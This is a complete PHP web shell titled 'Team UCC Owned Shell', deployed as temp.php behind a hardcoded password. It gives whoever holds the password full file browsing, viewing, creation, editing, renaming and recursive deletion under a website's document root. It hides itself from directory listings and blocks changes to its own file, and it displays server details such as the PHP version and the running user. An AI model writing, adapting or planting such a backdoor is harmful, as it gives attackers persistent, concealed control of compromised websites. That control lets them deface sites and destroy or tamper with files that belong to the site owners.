<?php
session_start();

$PASSWORD = 'odiyan911';
$SHELL_NAME = 'temp.php';

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $PASSWORD) {
            $_SESSION['authenticated'] = true;
        } else {
            $error = "Incorrect password.";
        }
    }
    if (!isset($_SESSION['authenticated'])) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8" />
            <title>Access Restricted</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
                body {
                    background-color: #000;
                    color: #0f0;
                    font-family: 'Share Tech Mono', monospace;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    flex-direction: column;
                }
                h1 {
                    text-shadow: 0 0 10px #0f0;
                    margin-bottom: 20px;
                }
                form {
                    background: #001100;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 0 15px #0f0;
                }
                input[type="password"] {
                    background: #002200;
                    border: 1px solid #0f0;
                    color: #0f0;
                    font-family: 'Share Tech Mono', monospace;
                    font-size: 1.2em;
                    padding: 10px;
                    border-radius: 5px;
                    width: 250px;
                    outline: none;
                }
                button {
                    margin-top: 15px;
                    background: #0f0;
                    border: none;
                    color: #000;
                    font-weight: bold;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-family: 'Share Tech Mono', monospace;
                    font-size: 1.1em;
                    transition: background-color 0.3s ease;
                    width: 100%;
                }
                button:hover {
                    background: #0c0;
                }
                .error {
                    color: #f00;
                    margin-top: 15px;
                    font-weight: bold;
                    text-align: center;
                    text-shadow: 0 0 5px #f00;
                }
            </style>
        </head>
        <body>
            <h1>ACCESS RESTRICTED</h1>
            <form method="POST" autocomplete="off">
                <input type="password" name="password" placeholder="Enter password" autofocus required />
                <button type="submit">ENTER</button>
                <?php if (isset($error)): ?>
                    <div class="error"><?php echo htmlspecialchars($error); ?></div>
                <?php endif; ?>
            </form>
        </body>
        </html>
        <?php
        exit;
    }
}

// Base directory is DOCUMENT_ROOT to allow access above shell location
$base_dir = realpath(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__);
if ($base_dir === false) {
    $base_dir = realpath(__DIR__);
}

// Current path from GET, default to base_dir
$requested_path = isset($_GET['path']) ? $_GET['path'] : '';
$real_path = realpath($base_dir . DIRECTORY_SEPARATOR . $requested_path);
if ($real_path === false || strpos($real_path, $base_dir) !== 0) {
    $real_path = $base_dir;
}

// Handle file creation, modification, rename, delete
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        $action = $_POST['action'];
        $current_path = isset($_POST['current_path']) ? $_POST['current_path'] : '';
        $target_dir = realpath($base_dir . DIRECTORY_SEPARATOR . $current_path);
        if ($target_dir === false || strpos($target_dir, $base_dir) !== 0) {
            $message = "Error: Invalid directory.";
        } else {
            if ($action === 'create' && isset($_POST['filename'], $_POST['content'])) {
                $filename = basename($_POST['filename']);
                $content = $_POST['content'];
                if ($filename === $SHELL_NAME) {
                    $message = "Error: Modification of shell file is not allowed.";
                } else {
                    $filepath = $target_dir . DIRECTORY_SEPARATOR . $filename;
                    if (file_exists($filepath)) {
                        $message = "Error: File already exists.";
                    } else {
                        if (file_put_contents($filepath, $content) !== false) {
                            $message = "File '$filename' created successfully.";
                        } else {
                            $message = "Error: Could not create file.";
                        }
                    }
                }
            } elseif ($action === 'edit' && isset($_POST['filename'], $_POST['content'])) {
                $filename = basename($_POST['filename']);
                $content = $_POST['content'];
                if ($filename === $SHELL_NAME) {
                    $message = "Error: Modification of shell file is not allowed.";
                } else {
                    $filepath = $target_dir . DIRECTORY_SEPARATOR . $filename;
                    if (!file_exists($filepath)) {
                        $message = "Error: File does not exist.";
                    } else {
                        if (file_put_contents($filepath, $content) !== false) {
                            $message = "File '$filename' saved successfully.";
                        } else {
                            $message = "Error: Could not save file.";
                        }
                    }
                }
            } elseif ($action === 'delete' && isset($_POST['target'])) {
                $target = basename($_POST['target']);
                if ($target === $SHELL_NAME) {
                    $message = "Error: Deletion of shell file is not allowed.";
                } else {
                    $target_path = $target_dir . DIRECTORY_SEPARATOR . $target;
                    if (!file_exists($target_path)) {
                        $message = "Error: Target does not exist.";
                    } else {
                        if (is_dir($target_path)) {
                            // Delete directory recursively
                            function rrmdir($dir) {
                                if (!is_dir($dir)) return;
                                $objects = scandir($dir);
                                foreach ($objects as $object) {
                                    if ($object != "." && $object != "..") {
                                        $objPath = $dir . DIRECTORY_SEPARATOR . $object;
                                        if (is_dir($objPath)) rrmdir($objPath);
                                        else unlink($objPath);
                                    }
                                }
                                rmdir($dir);
                            }
                            rrmdir($target_path);
                            $message = "Directory '$target' deleted successfully.";
                        } else {
                            if (unlink($target_path)) {
                                $message = "File '$target' deleted successfully.";
                            } else {
                                $message = "Error: Could not delete file.";
                            }
                        }
                    }
                }
            } elseif ($action === 'rename' && isset($_POST['target'], $_POST['newname'])) {
                $target = basename($_POST['target']);
                $newname = basename($_POST['newname']);
                if ($target === $SHELL_NAME || $newname === $SHELL_NAME) {
                    $message = "Error: Renaming shell file is not allowed.";
                } else {
                    $old_path = $target_dir . DIRECTORY_SEPARATOR . $target;
                    $new_path = $target_dir . DIRECTORY_SEPARATOR . $newname;
                    if (!file_exists($old_path)) {
                        $message = "Error: Target does not exist.";
                    } elseif (file_exists($new_path)) {
                        $message = "Error: New name already exists.";
                    } else {
                        if (rename($old_path, $new_path)) {
                            $message = "Renamed '$target' to '$newname' successfully.";
                        } else {
                            $message = "Error: Could not rename.";
                        }
                    }
                }
            }
        }
    }
}

// Handle file viewing or editing
$view_file = isset($_GET['view']) ? $_GET['view'] : '';
$file_content = '';
$file_error = '';
$editing = false;
if ($view_file !== '') {
    $view_path = realpath($base_dir . DIRECTORY_SEPARATOR . $view_file);
    if ($view_path === false || strpos($view_path, $base_dir) !== 0 || !is_file($view_path)) {
        $file_error = "Error: File not found or access denied.";
    } elseif (basename($view_path) === $SHELL_NAME) {
        $file_error = "Error: Access to shell file content is forbidden.";
    } else {
        $file_content = file_get_contents($view_path);
        $editing = isset($_GET['edit']);
    }
}

$files = scandir($real_path);

function relativePath($base, $path) {
    return ltrim(str_replace($base, '', $path), DIRECTORY_SEPARATOR);
}

$current_rel_path = relativePath($base_dir, $real_path);

// Server info for info bar
$server_info = [
    'PHP Version' => phpversion(),
    'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A',
    'User' => get_current_user(),
    'Document Root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'N/A',
    'Server Name' => isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A',
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Team UCC Owned Shell</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    body {
        background-color: #0f0f0f;
        color: #00ff00;
        font-family: 'Share Tech Mono', monospace;
        margin: 0;
        padding: 0;
    }
    .info-bar {
        background-color: #002200;
        border-bottom: 2px solid #00ff00;
        padding: 10px 20px;
        font-size: 0.9em;
        display: flex;
        flex-wrap: wrap;
        gap: 15px;
        user-select: none;
        align-items: center;
        justify-content: space-between;
    }
    .info-left, .info-right {
        display: flex;
        gap: 15px;
        align-items: center;
        flex-wrap: wrap;
    }
    .info-bar div {
        white-space: nowrap;
    }
    h1, h2 {
        text-shadow: 0 0 5px #00ff00;
        margin: 20px;
    }
    a {
        color: #00ff00;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
    .container {
        max-width: 900px;
        margin: 0 auto 40px auto;
        padding: 0 20px 20px 20px;
    }
    ul {
        list-style-type: none;
        padding-left: 0;
    }
    ul li {
        padding: 5px 10px;
        border-bottom: 1px solid #004400;
        display: flex;
        justify-content: space-between;
        align-items: center;
        white-space: nowrap;
    }
    ul li span.dir {
        color: #00cc00;
        font-weight: bold;
        margin-right: 10px;
    }
    .message {
        background-color: #003300;
        border: 1px solid #00ff00;
        padding: 10px;
        margin-bottom: 20px;
        border-radius: 5px;
    }
    .error {
        background-color: #330000;
        border-color: #ff0000;
        color: #ff4444;
    }
    .success {
        background-color: #003300;
        border-color: #00ff00;
        color: #00ff00;
    }
    form {
        background-color: #001100;
        padding: 15px;
        border-radius: 5px;
        margin-top: 20px;
    }
    label {
        display: block;
        margin-bottom: 8px;
    }
    input[type="text"], textarea {
        width: 100%;
        background-color: #002200;
        border: 1px solid #00ff00;
        color: #00ff00;
        font-family: 'Share Tech Mono', monospace;
        font-size: 1em;
        padding: 8px;
        border-radius: 3px;
        margin-bottom: 15px;
        resize: vertical;
    }
    button, .file-actions button {
        background-color: #00ff00;
        border: none;
        color: #000;
        font-weight: bold;
        padding: 5px 10px;
        cursor: pointer;
        border-radius: 3px;
        font-family: 'Share Tech Mono', monospace;
        font-size: 0.9em;
        transition: background-color 0.3s ease;
        margin-left: 5px;
        white-space: nowrap;
    }
    button:hover, .file-actions button:hover {
        background-color: #00cc00;
    }
    pre {
        background-color:#001100;
        border: 1px solid #00ff00;
        padding: 15px;
        border-radius: 5px;
        overflow-x: auto;
        white-space: pre-wrap;
        word-wrap: break-word;
        max-height: 400px;
    }
    nav {
        margin-bottom: 20px;
    }
    nav a {
        margin-right: 10px;
    }
    .file-actions {
        display: flex;
        align-items: center;
        flex-shrink: 0;
    }
    .rename-form {
        display: inline-flex;
        align-items: center;
    }
    .rename-form input[type="text"] {
        width: auto;
        margin-right: 5px;
        padding: 3px 6px;
        font-size: 0.9em;
    }
</style>
<script>
function confirmDelete(name) {
    return confirm("Are you sure you want to delete '" + name + "'?");
}
function showRenameForm(id) {
    document.getElementById('rename-display-' + id).style.display = 'none';
    document.getElementById('rename-form-' + id).style.display = 'inline-flex';
    document.getElementById('rename-input-' + id).focus();
}
function cancelRename(id) {
    document.getElementById('rename-form-' + id).style.display = 'none';
    document.getElementById('rename-display-' + id).style.display = 'inline';
}
</script>
</head>
<body>
<div class="info-bar">
    <div class="info-left">
        <div><strong>Shell Name:</strong> <?php echo htmlspecialchars($SHELL_NAME); ?></div>
        <?php foreach ($server_info as $key => $value): ?>
            <div><strong><?php echo htmlspecialchars($key); ?>:</strong> <?php echo htmlspecialchars($value); ?></div>
        <?php endforeach; ?>
    </div>
    <div class="info-right">
        <a href="?logout=1" style="color:#ff4444; font-weight:bold; text-decoration:none;">Logout</a>
    </div>
</div>
<div class="container">
    <h1>Team UCC Owned Shell</h1>
    <nav>
        <strong>Current Path:</strong>
        <?php
        $parts = explode(DIRECTORY_SEPARATOR, $current_rel_path);
        $path_accum = '';
        echo '<a href="?">/</a>';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $path_accum .= DIRECTORY_SEPARATOR . $part;
            echo ' / <a href="?path=' . urlencode(ltrim($path_accum, DIRECTORY_SEPARATOR)) . '">' . htmlspecialchars($part) . '</a>';
        }
        ?>
    </nav>

    <?php if ($message): ?>
        <div class="message <?php echo strpos($message, 'Error') === false ? 'success' : 'error'; ?>">
            <?php echo htmlspecialchars($message); ?>
        </div>
    <?php endif; ?>

    <?php if ($file_error): ?>
        <div class="message error"><?php echo htmlspecialchars($file_error); ?></div>
    <?php endif; ?>

    <?php if ($file_content !== ''): ?>
        <h2><?php echo $editing ? 'Editing File:' : 'Viewing File:'; ?> <?php echo htmlspecialchars($view_file); ?></h2>
        <?php if ($editing): ?>
            <form method="POST" autocomplete="off">
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars(basename($view_file)); ?>" />
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars(dirname($view_file)); ?>" />
                <input type="hidden" name="action" value="edit" />
                <textarea name="content" rows="20" required><?php echo htmlspecialchars($file_content); ?></textarea>
                <button type="submit">Save</button>
                <a href="?path=<?php echo urlencode($current_rel_path); ?>" style="margin-left:10px; color:#00ff00;">Cancel</a>
            </form>
        <?php else: ?>
            <pre><?php echo htmlspecialchars($file_content); ?></pre>
            <p>
                <a href="?view=<?php echo urlencode($view_file); ?>&edit=1" style="color:#00ff00;">Edit</a> |
                <a href="?path=<?php echo urlencode($current_rel_path); ?>" style="color:#00ff00;">Back to directory</a>
            </p>
        <?php endif; ?>
    <?php else: ?>
        <h2>Files and Directories</h2>
        <ul>
    <?php
    if ($real_path !== $base_dir) {
        $parent_path = dirname($current_rel_path);
        echo '<li><a href="?path=' . urlencode($parent_path) . '">[..]</a></li>';
    }
    $id_counter = 0;
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        if ($file === $SHELL_NAME) continue;
        $full_path = $real_path . DIRECTORY_SEPARATOR . $file;
        $is_dir = is_dir($full_path);
        $id = $id_counter++;
        echo '<li>';
        if ($is_dir) {
            // Directory name is a link to navigate into it
            $dir_rel_path = ltrim($current_rel_path . DIRECTORY_SEPARATOR . $file, DIRECTORY_SEPARATOR);
            echo '<a href="?path=' . urlencode($dir_rel_path) . '" class="dir">' . htmlspecialchars($file) . '</a>';
        } else {
            echo '<span class="file">' . htmlspecialchars($file) . '</span>';
        }
        echo '<div class="file-actions">';
        if (!$is_dir) {
            echo '<a href="?view=' . urlencode($current_rel_path . DIRECTORY_SEPARATOR . $file) . '" style="color:#00ff00; text-decoration:none;"><button type="button">Edit</button></a>';
        }
        // Rename display and form
        echo '<span id="rename-display-' . $id . '">';
        echo '<button type="button" onclick="showRenameForm(' . $id . ')">Rename</button>';
        echo '</span>';
        echo '<form method="POST" class="rename-form" id="rename-form-' . $id . '" style="display:none;" onsubmit="return this.newname.value.trim() !== \'\';">';
        echo '<input type="hidden" name="action" value="rename" />';
        echo '<input type="hidden" name="target" value="' . htmlspecialchars($file) . '" />';
        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel_path) . '" />';
        echo '<input type="text" name="newname" id="rename-input-' . $id . '" value="' . htmlspecialchars($file) . '" required />';
        echo '<button type="submit">Save</button>';
        echo '<button type="button" onclick="cancelRename(' . $id . ')">Cancel</button>';
        echo '</form>';
        // Delete button with confirmation
        echo '<form method="POST" style="display:inline;" onsubmit="return confirmDelete(\'' . addslashes($file) . '\');">';
        echo '<input type="hidden" name="action" value="delete" />';
        echo '<input type="hidden" name="target" value="' . htmlspecialchars($file) . '" />';
        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel_path) . '" />';
        echo '<button type="submit">Delete</button>';
        echo '</form>';
        echo '</div>';
        echo '</li>';
    }
    ?>
</ul>
        <h2>Create New File</h2>
        <form method="POST" autocomplete="off">
            <input type="hidden" name="action" value="create" />
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_rel_path); ?>" />
            <label for="filename">Filename:</label>
            <input type="text" name="filename" id="filename" required />
            <label for="content">Content:</label>
            <textarea name="content" id="content" rows="10"></textarea>
            <button type="submit">Create File</button>
        </form>
    <?php endif; ?>
</div>
</body>
</html>
